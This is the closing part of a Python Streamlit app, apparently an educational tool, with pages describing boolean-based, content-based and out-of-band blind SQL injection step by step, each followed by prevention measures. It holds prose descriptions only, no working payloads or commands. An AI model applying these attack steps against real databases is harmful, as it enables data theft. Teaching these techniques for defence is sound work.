                 "4. Exploiting the vulnerability: The attacker's input manipulates the SQL query's logic, injecting Boolean operators (such as AND, OR, or NOT) and conditional statements (such as equals, greater than, less than) to modify the query's behavior.\n\n"
                 "5. Analyzing the application's response: Based on the application's response, such as error messages, behavior changes, or differences in the application's output, the attacker can infer whether the injected condition was true or false. This helps them gather information about the underlying database structure or extract sensitive data.\n\n"
                 "6. Expanding the attack: Once the attacker has determined the correct Boolean conditions, they can further exploit the vulnerability to extract data, perform unauthorized actions, or launch additional attacks")
        st.write("To prevent Boolean-Based Blind SQL injection: \n\n"
                 " 1. Input validation and sanitization\n\n"
                 " 2. Principle of least privilege\n\n"
                 " 3. Regular security updates\n\n"
                 " 4. Security testing")
    elif page == "Content Info Page":
        st.markdown("<h2 style='text-align: center;'>CONTENT-BASED BLIND SQL Injection</h2>", unsafe_allow_html=True)
        st.write("Content-based SQL injection is a technique used by attackers to exploit vulnerabilities in a web application's database layer by manipulating the content of specific fields or parameters.  \n"
                 "Unlike traditional SQL injection attacks that focus on altering the structure or logic of SQL queries, content-based SQL injection targets the actual data being processed by the application.\n\n. "
                 "Here's a step-by-step overview of how content-based blind SQL injection works:\n\n"
                 "1. Identifying vulnerable fields: The attacker identifies specific fields or parameters within the web application that are susceptible to content-based SQL injection. These fields can include user input forms, search queries, or any other input that is directly used in database operations.\n\n"
                 "2. Crafting malicious content: The attacker crafts malicious input by injecting SQL code into the content of the vulnerable fields. The injected SQL code is designed to manipulate the application's SQL queries when the content is processed.\n\n"
                 "3. Submitting the payload: The attacker submits the crafted input, containing the malicious content, through the vulnerable field or parameter. The application, without proper sanitization or validation, includes the attacker's input directly in the SQL query.\n\n"
                 "4. Exploiting the vulnerability: The malicious content injected by the attacker is interpreted as part of the SQL query, leading to unintended behavior or unauthorized access to the database. The attacker's goal may be to extract sensitive data, modify or delete data, or perform other malicious actions.\n\n"
                 "5. Analyzing the application's response: The attacker examines the application's response to determine if the SQL injection was successful. They may look for changes in the application's behavior, error messages, or differences in the output to gather information or confirm the success of the attack.\n\n"
                 "6. Expanding the attack: Once the attacker has successfully injected SQL code into the content, they can further exploit the vulnerability to execute additional SQL commands, retrieve more data, or perform unauthorized actions.")
        st.write("To prevent Boolean-Based Blind SQL injection: \n\n"
                 " 1. Input validation and sanitization\n\n"
                 " 2. Stored procedures\n\n"
                 " 3. Regular security updates\n\n"
                 " 4. Principle of least privilege")
    elif page == "Out-of-band Info Page":
        st.markdown("<h2 style='text-align: center;'>Out-Of-Band BLIND SQL Injection</h2>", unsafe_allow_html=True)
        st.write("Out-of-band SQL injection is a type of SQL injection attack where the attacker's payload is designed to communicate with an external server or resource controlled by the attacker, rather than relying solely on the application's response. \n"
                 "  This type of attack is useful when the application's response is limited or restricted due to various security measures\n\n. "
                 "Here's a step-by-step overview of how out-of-band blind SQL injection works:\n\n"
                 "1. Identifying the vulnerability: The attacker identifies a vulnerable parameter within the web application that is susceptible to SQL injection. This can be a user input field, URL parameter, or any other input that interacts with the application's database.\n\n"
                 "2. Crafting the malicious payload: The attacker crafts a specially designed payload that includes SQL code capable of initiating outbound connections to an external server or resource under the attacker's control. This can involve using techniques such as DNS requests, HTTP requests, or other means of communication.\n\n"
                 "3. Injecting the payload: The attacker injects the crafted payload into the vulnerable parameter of the application. The application, without proper input validation or sanitization, incorporates the attacker's payload into the SQL query.\n\n"
                 "4. Establishing communication: The injected SQL code initiates outbound connections to the attacker's controlled server or resource, enabling communication between the attacker and the targeted application.\n\n"
                 "5. Retrieving data or performing actions: Through the established communication channel, the attacker can retrieve data from the application's database, execute arbitrary commands, modify data, or perform other malicious actions.\n\n"
                 "6. Expanding the attack: Once the initial connection is established, the attacker can leverage the out-of-band communication to further exploit the application's vulnerabilities, gather more information, or launch additional attacks.")
        st.write("To prevent Out-Of-Band Blind SQL injection: \n\n"
                 " 1. Input validation and sanitization\n\n"
                 " 2. Web Application Firewall \n\n"
                 " 3. Regular security updates\n\n"
                 " 4. Principle of least privilege")
if __name__ == "__main__":
    main()
